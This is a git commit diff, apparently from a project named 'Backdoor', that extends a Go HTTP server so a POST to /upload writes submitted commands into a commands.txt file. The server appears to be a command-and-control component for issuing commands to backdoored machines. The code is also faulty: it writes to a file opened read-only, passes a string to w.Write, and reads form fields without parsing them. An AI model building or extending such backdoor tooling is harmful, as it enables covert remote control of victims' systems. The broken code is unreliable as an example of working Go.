dfc9e678d23140f039bf4d1262d7ccc06602cd0e
Gökdeniz Dağ <mountainskysea07@gmail.com>
2023-08-30 15:22:20 +0300

    Finished server.go

--- Backdoor/server/server.go
+++ Backdoor/server/server.go
@@ -11,12 +11,26 @@ import (
 func main() {
 	addr:=fmt.Sprintf("127.0.0.1:%d",GeneratePortNumber())
 	http.HandleFunc("/upload",func(w http.ResponseWriter, r *http.Request ){
-		filedata,err:=os.ReadFile("static/upload.html")
-		if err != nil{
-			log.Fatal(err)
-		}
-		w.Header().Set("Content-Type","text/plain")
-		fmt.Fprint(w,string(filedata))
+		if r.Method=="GET"{
+			filedata,err:=os.ReadFile("static/upload.html")
+			if err != nil{
+				log.Fatal(err)
+			}
+			w.Header().Set("Content-Type","text/plain")
+			fmt.Fprint(w,string(filedata))
+		}else if r.Method=="POST" {
+			commands :=r.Form.Get("commands")
+			cmdfile,err:=os.Open("commands.txt")
+			if err != nil {
+				log.Fatal(err)
+			}
+			defer cmdfile.Close()
+			_,err= cmdfile.Write([]byte(commands))
+			if err != nil{
+				log.Fatal(err)
+			}
+			w.Write("Successfully updated commands file!")
+		} 
 	})
 	http.HandleFunc("/",func(w http.ResponseWriter, r *http.Request) {
 		if r.Method=="GET"{
